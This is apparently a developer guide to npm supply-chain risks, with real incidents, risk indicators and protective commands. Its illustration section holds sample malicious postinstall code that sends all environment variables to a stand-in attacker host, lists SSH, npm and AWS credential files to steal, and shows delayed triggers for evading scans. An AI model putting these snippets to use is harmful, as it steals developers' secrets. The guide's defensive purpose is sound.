# npm Package Risks

> **30-second summary:** Not every package on npm is safe. Malicious actors publish packages intentionally, and legitimate packages can be compromised after the fact. Knowing the risk indicators helps you avoid installing malware.

---

## How Packages Become Dangerous

### 1. Intentionally Malicious Packages

An attacker publishes a new package — often with a name very close to a popular one — that contains malware from day one. The package might even have a legitimate-sounding purpose while also:

- Exfiltrating environment variables (`process.env`) to a remote server
- Installing a cryptominer
- Opening a reverse shell
- Stealing credentials from `~/.npmrc`, `~/.ssh`, or browser storage

### 2. Compromised Maintainer Accounts

A legitimate, popular package is taken over after the original maintainer's account is compromised (weak password, phishing, reused credentials). The attacker publishes a new version containing malicious code. This is particularly dangerous because:

- The package has an established trust history
- CI/CD pipelines auto-install the latest version
- `npm audit` won't flag it until a CVE is filed (which takes time)

**Real example — ua-parser-js (October 2021):**
The npm account for `ua-parser-js` (8 million weekly downloads) was hijacked. Versions `0.7.29`, `0.8.0`, and `1.0.1` were published containing a cryptominer (Linux/macOS) and credential stealer (Windows). Anyone running `npm install` during the ~4-hour window received malware.

**Real example — event-stream (November 2018):**
The original author of `event-stream` transferred ownership to a new maintainer who had offered to "help maintain" the package. That maintainer added `flatmap-stream` as a dependency, which contained encrypted malicious code specifically targeting the Copay Bitcoin wallet app. The attack was active for ~2 months before discovery.

### 3. Maintainer Intentional Sabotage

Sometimes the maintainer themselves introduces malicious or destructive behaviour — out of protest, commercial pressure, or mental health crisis.

**Real example — colors and faker (January 2022):**
Marak Squirrells, the maintainer of `colors` (19 million weekly downloads) and `faker` (2.4 million weekly downloads), deliberately published corrupted versions. `colors` entered an infinite loop printing gibberish, breaking thousands of applications including AWS CDK. He had previously complained about not being compensated for open source work.

**Real example — node-ipc (March 2022):**
The maintainer added a wiper that deleted files on systems with Russian or Belarusian IP addresses — in protest of the Ukraine war. The package is a dependency of `vue-cli`.

### 4. Malicious `postinstall` Scripts

npm packages can run arbitrary shell commands during installation via `preinstall`, `install`, and `postinstall` scripts in `package.json`. Attackers use these to execute malware the moment you run `npm install`.

```json
{
  "scripts": {
    "postinstall": "node ./scripts/install.js"
  }
}
```

The `install.js` file — which you probably haven't read — might be doing anything.

---

## Risk Indicators

### Red Flags — Investigate Before Installing

| Indicator | Why It's Risky |
|---|---|
| **Recent ownership transfer** | New maintainer may have malicious intent |
| **Very low download count** | Not battle-tested; less scrutiny |
| **No source repository** | Can't inspect the code; no issue tracker |
| **Repository and npm package diverge** | Published code ≠ what's on GitHub |
| **Postinstall scripts** | Executes code at install time |
| **Requests broad network access** | May be exfiltrating data |
| **Very new package (< 3 months)** | No established track record |
| **No recent commits despite active issues** | Possibly abandoned |
| **Single maintainer** | No redundancy; single point of compromise |
| **Package name very similar to popular package** | Possible typosquatting |
| **Sudden spike in version numbers** | May indicate account takeover + rushed publish |
| **Dependencies on obscure sub-packages** | Attack may be in a transitive dep |

### Green Flags — Signs of a Healthy Package

| Indicator | What It Signals |
|---|---|
| High weekly downloads (millions) | Widely used, more eyes on the code |
| Active GitHub repo with recent commits | Maintained |
| Multiple maintainers | Harder to compromise |
| Long history (years, not months) | Established trust |
| Published provenance/SLSA attestation | Verifiable build chain |
| Semantic versioning with changelogs | Professional maintenance |
| Tests and CI pipeline visible | Quality-conscious maintainer |

---

## What Malicious Packages Actually Do

### Environment Variable Exfiltration

The most common attack — grab all your secrets at install time:

```js
// Malicious postinstall script
const https = require('https');
const env = JSON.stringify(process.env);

https.request({
  hostname: 'attacker.example.com',
  path: '/collect',
  method: 'POST',
  headers: { 'Content-Length': env.length }
}, () => {}).end(env);
```

This sends your `.env` variables — database URLs, API keys, AWS credentials — to an attacker's server the moment you run `npm install`.

### Credential File Theft

```js
// Steal npm tokens, SSH keys, git credentials
const fs = require('fs');
const os = require('os');
const path = require('path');

const targets = [
  path.join(os.homedir(), '.npmrc'),
  path.join(os.homedir(), '.ssh', 'id_rsa'),
  path.join(os.homedir(), '.gitconfig'),
  path.join(os.homedir(), '.aws', 'credentials'),
];
// ... exfiltrate each file
```

### Delayed/Conditional Execution

Sophisticated attacks wait until runtime or trigger only under specific conditions to evade detection:

```js
// Only activate when running in a specific app (e.g., Copay wallet pattern)
if (process.env.npm_package_name === 'target-app') {
  // malicious code
}

// Only activate after a delay (evade automated scanning)
setTimeout(() => { /* malicious code */ }, 1000 * 60 * 60 * 24); // 24 hours
```

---

## How to Protect Yourself

### Disable Install Scripts in CI

```bash
# .npmrc for CI environment
ignore-scripts=true
```

Or per-install:

```bash
npm install --ignore-scripts
```

> **Critical:** Some packages genuinely need install scripts (e.g., packages that compile native binaries). Review any `postinstall` scripts for legitimate packages before enabling them.

### Use npm Audit

```bash
# Check for known vulnerabilities
npm audit

# Auto-fix where possible
npm audit fix

# JSON output for CI
npm audit --json
```

### Enable Provenance Verification

npm now supports SLSA provenance attestations. Check if a package has one:

```bash
npm audit signatures
```

### Lock Down Your npm Config

```ini
# ~/.npmrc
audit=true
fund=false
ignore-scripts=true  # CI only — breaks some packages locally
```

### Monitor for Anomalous Behaviour

At runtime, watch for packages making unexpected outbound calls. Use tools like:
- **Socket.dev** — analyses npm packages for suspicious behaviour before install
- **Snyk** — vulnerability scanning with supply chain awareness
- **Semgrep** — static analysis to detect data exfiltration patterns

---

## Real Commands for Risk Assessment

```bash
# Check package metadata before installing
npm info <package-name>

# See who maintains it
npm info <package-name> maintainers

# Check when it was last published
npm info <package-name> time

# View the install scripts
npm info <package-name> scripts

# See full package.json
npm view <package-name> --json

# Check for known vulnerabilities
npm audit

# Inspect a specific package's files before installing
npx npmfs <package-name>
```

---

## Checklist

- [ ] Checked download counts before installing any new package
- [ ] Reviewed `postinstall` scripts for any package with them
- [ ] Verified the package has a linked GitHub repository
- [ ] Confirmed the npm package content matches the GitHub source
- [ ] `npm audit` returns no high/critical vulnerabilities
- [ ] `ignore-scripts=true` set in CI `.npmrc`
- [ ] New packages vetted using the steps in [auditing-a-package.md](./auditing-a-package.md)
- [ ] Monitoring for unexpected outbound network calls at runtime
